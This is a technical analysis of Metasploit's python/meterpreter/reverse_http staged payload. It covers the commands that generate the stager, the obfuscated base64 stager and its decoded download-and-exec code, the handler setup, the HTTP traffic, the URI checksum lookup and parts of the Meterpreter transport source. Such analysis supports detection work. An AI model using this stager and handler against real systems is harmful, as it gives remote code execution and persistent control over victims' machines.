# python/meterpreter/reverse_http (staged payload)

## Stager

### Generate
```
msf5> use python/meterpreter/reverse_http
msf5 payload(python/meterpreter/reverse_http) > set lhost 127.0.0.1
msf5 payload(python/meterpreter/reverse_http) > generate -f raw -o /shared/stager.py
```

### Result
```python
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.
version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oez
I6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3Blbm
VyJ10pCmhzPVtdCm89dWwuYnVpbGRfb3BlbmVyKCpocykKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbn
QnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIE
dlY2tvJyldCmV4ZWMoby5vcGVuKCdodHRwOi8vMTI3LjAuMC4xOjgwODAvNWcwMlInKS5yZWFkKCkpCg
==')))
```

Note: the dict is used to apply py2/3 compatibility with regards to decoding strings

#### Base64 Decoded Content
```python
import sys
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
hs=[]
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(o.open('http://127.0.0.1:8080/5g02R').read())
```

## Payload (meterpreter)
The payload is sent when executing the multi/handler exploit module with the
corresponding payload:
```
msf5> use exploit/multi/handler
msf5 exploit(multi/handler) > set payload python/meterpreter/reverse_http
msf5 exploit(multi/handler) > set lhost 0.0.0.0
msf5 exploit(multi/handler) > set lport 8080
msf5 exploit(multi/handler) > exploit
```

When connecting to the handler, Metasploit mimicks an Apache server:
```
# curl -v http://127.0.0.1:8080/
* Expire in 0 ms for 6 (transfer 0x56404fb947a0)
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x56404fb947a0)
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.64.0
> Accept: */*
>
< HTTP/1.1 404 File not found
< Content-Type: text/html
< Connection: close
< Server: Apache
< Content-Length: 141
<
* Closing connection 0
<html><head><title>404 Not Found</title></head><body><h1>Not found</h1>The requested URL / was not found on this server.<p><hr></body></html>
```

From the HTTP traffic, we can see how the meterpreter payload is provided from
the server when a specific URL path is requested:
```
GET /5g02R HTTP/1.1
Accept-Encoding: identity
Host: 127.0.0.1:8080
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: close
Server: Apache
Content-Length: 53956

#!/usr/bin/python
import binascii
import code
import os
import platform
import random
import re
...
```

The right payload is provided according to the checksum of the ASCII characters
in the URL path (modulo 2^8). In this case, `5g02R` is `53 + 103 + 48 + 50 + 82 = 336 = 80 (mod 256)`.
The payload is then selected according to the following lookup table
([source](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/payloads/meterpreter/uri_checksum.rb)):

```python
#
# Define 8-bit checksums for matching URLs
# These are based on charset frequency
#
URI_CHECKSUM_INITW      = 92 # Windows
URI_CHECKSUM_INITN      = 92 # Native (same as Windows)
URI_CHECKSUM_INITP      = 80 # Python
URI_CHECKSUM_INITJ      = 88 # Java
URI_CHECKSUM_CONN       = 98 # Existing session
URI_CHECKSUM_INIT_CONN  = 95 # New stageless session
```

Once the payload is executed, Meterpreter will use the HTTP transport to connect
back to the handler, when `HTTP_CONNECTION_URL` is defined.
```python
...
# these values will be patched, DO NOT CHANGE THEM
DEBUGGING = False
TRY_TO_FORK = True
HTTP_CONNECTION_URL = 'http://127.0.0.1:8080/vZTmXAyyDvpdfEhoAzQRWQuHfGijteWN8k9UD/'
HTTP_PROXY = None
HTTP_USER_AGENT = 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
HTTP_COOKIE = None
...
_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
if not _try_to_fork or (_try_to_fork and os.fork() == 0):
    if hasattr(os, 'setsid'):
        try:
            os.setsid()
        except OSError:
            pass
    if HTTP_CONNECTION_URL and has_urllib:
        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
    else:
        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
        transport = TcpTransport.from_socket(s)
    met = PythonMeterpreter(transport)
    # PATCH-SETUP-TRANSPORTS #
    met.run()
```

The checksum of the URI path is 98, which maps to `URI_CHECKSUM_CONN` (existing session):
```
$ python -c "print(reduce(lambda a, b: a+b, [ord(c) for c in 'vZTmXAyyDvpdfEhoAzQRWQuHfGijteWN8k9UD']) % 256)"
98
```
